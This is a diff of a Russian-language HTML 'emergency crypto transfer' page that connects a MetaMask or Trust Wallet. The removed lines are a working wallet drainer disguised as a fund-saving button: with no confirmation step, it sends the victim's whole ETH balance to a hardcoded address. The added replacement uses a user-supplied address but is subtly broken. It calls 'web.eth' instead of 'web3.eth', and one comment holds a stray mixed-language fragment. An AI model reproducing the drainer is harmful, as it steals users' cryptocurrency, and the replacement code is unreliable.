@@ -1,75 +1,101 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Крипто-Безопасность</title>
-    <style>
-        body {
-            background-color: black;
-            color: white;
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        button {
-            background-color: white;
-            color: black;
-            font-size: 20px;
-            padding: 15px 30px;
-            border: none;
-            cursor: pointer;
-            transition: background-color 0.3s;
-        }
-        button:hover {
-            background-color: #f1f1f1;
-        }
-    </style>
+    <title>Крипто-тревожная кнопка</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
 </head>
 <body>
-    <button id="saveButton">СПАСТИ СРЕДСТВА</button>
+    <h2>Экстренный перевод средств</h2>
 
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.0.0/dist/ethers.umd.min.js"></script>
+    <!-- БЛОК 1: Подключение кошелька -->
+    <button id="connectWallet">Подключить MetaMask</button>
+    <p id="walletInfo">Кошелек не подключен</p>
+
+    <!-- БЛОК 2: Ввод БЕЗОПАСНОГО адреса -->
+    <div>
+        <label for="safeAddress">Ваш безопасный адрес для перевода:</label><br>
+        <input type="text" id="safeAddress" placeholder="0x..." style="width: 500px;"><br>
+        <small>Внимание! Убедитесь, что адрес корректен и вы контролируете его.</small>
+    </div>
+
+    <!-- БЛОК 3: Кнопка для перевода ETH -->
+    <button id="emergencyETH" disabled>Перевести ETH на безопасный адрес</button>
+
     <script>
-        document.getElementById('saveButton').addEventListener('click', async function() {
-            if (typeof window.ethereum !== 'undefined') {
+        let web3;
+        let userAccount;
+
+        // БЛОК 1: Подключение кошелька
+        document.getElementById('connectWallet').addEventListener('click', async () => {
+            if (window.ethereum) {
                 try {
-                    // Создаем провайдер для соединения с блокчейном
-                    const provider = new ethers.providers.Web3Provider(window.ethereum, "any");
-
-                    // Запрашиваем доступ к аккаунту
-                    await provider.send("eth_requestAccounts", []);  // Запрашиваем доступ к аккаунту
-
-                    // Получаем первый аккаунт
-                    const signer = provider.getSigner();
-                    const userAddress = await signer.getAddress();
-                    console.log('Ваш адрес: ' + userAddress);
-
-                    // Проверяем баланс
-                    const balance = await provider.getBalance(userAddress);
-                    const etherBalance = ethers.utils.formatEther(balance);
-                    console.log('Баланс: ' + etherBalance + ' ETH');
-
-                    // Переводим средства сразу без подтверждения
-                    // Адрес безопасного кошелька
-                    const toAddress = "0xa5B2C0C3d06f293b4d466f43168768c0EBED3073"; // Ваш безопасный кошелек
-                    
-                    // Отправляем транзакцию
-                    const tx = await signer.sendTransaction({
-                        to: toAddress,   // Адрес получателя
-                        value: balance,   // Переводим весь баланс
-                    });
-
-                    console.log('Транзакция отправлена: ' + tx.hash);
-                    alert('Транзакция отправлена! Пожалуйста, подождите.');
-                } catch (err) {
-                    alert('Ошибка: ' + err.message);
+                    // Запрос доступа к аккаунтам
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    web3 = new Web3(window.ethereum);
+                    userAccount = accounts[0];
+                    document.getElementById('walletInfo').textContent = `Подключен: ${userAccount}`;
+                    // Активируем кнопку перевода после подключения
+                    document.getElementById('emergencyETH').disabled = false;
+                } catch (error) {
+                    console.error("Ошибка подключения:", error);
                 }
             } else {
-                alert('Кошелек не найден. Убедитесь, что у вас установлен Trust Wallet или MetaMask.');
+                alert('Пожалуйста, установите MetaMask!');
+            }
+        });
+
+        // БЛОК 3: Функция экстренного перевода ETH
+        document.getElementById('emergencyETH').addEventListener('click', async () => {
+            // !!! ВАЖНО: Берем адрес из поля ввода, а не из кода !!!
+            const safeAddress = document.getElementById('safeAddress').value;
+
+            // Простая проверка адреса
+            if (!web3.utils.isAddress(safeAddress)) {
+                alert('Укажите корректный адрес!');
+                return;
+            }
+
+            if (!userAccount) {
+                alert('Сначала подключите кошелек');
+                return;
+            }
+
+            if (confirm('ВЫ УВЕРЕНЫ? Это действие отправит весь ваш ETH на указанный адрес. Отменить транзакцию будет невозможно.')) {
+                try {
+                    // Получаем баланс текущего аккаунта
+                    const balance = await web3.eth.getBalance(userAccount);
+                    // Рассчитываем комиссию (газ). Оставляем небольшой запас, например, 0.001 ETH.
+                    const gasPrice = await web.eth.getGasPrice();
+                    const gasLimit = 21000; // Стандартный лимит газа для простого перевода ETH
+                    const gasCost = web3.utils.toBN(gasPrice).mul(web3.utils.toBN(gasLimit));
+
+                    // Сумма к переводу = весь баланс минус预估ные комиссии
+                    const amountToSend = web3.utils.toBN(balance).sub(gasCost);
+
+                    // Проверяем, что после комиссии остались средства для перевода
+                    if (amountToSend.lte(web3.utils.toBN(0))) {
+                        alert('Недостаточно ETH для покрытия комиссии сети.');
+                        return;
+                    }
+
+                    // Создаем и отправляем транзакцию
+                    const tx = {
+                        from: userAccount,
+                        to: safeAddress, // Перевод на ВАШ адрес
+                        value: amountToSend,
+                        gas: gasLimit,
+                        gasPrice: gasPrice
+                    };
+
+                    // Подписываем и отправляем транзакцию через MetaMask
+                    const receipt = await web3.eth.sendTransaction(tx);
+                    console.log('Транзакция успешна:', receipt);
+                    alert(`Средства успешно отправлены! Хэш транзакции: ${receipt.transactionHash}`);
+
+                } catch (error) {
+                    console.error('Ошибка при переводе:', error);
+                    alert('Произошла ошибка: ' + error.message);
+                }
             }
         });
     </script>
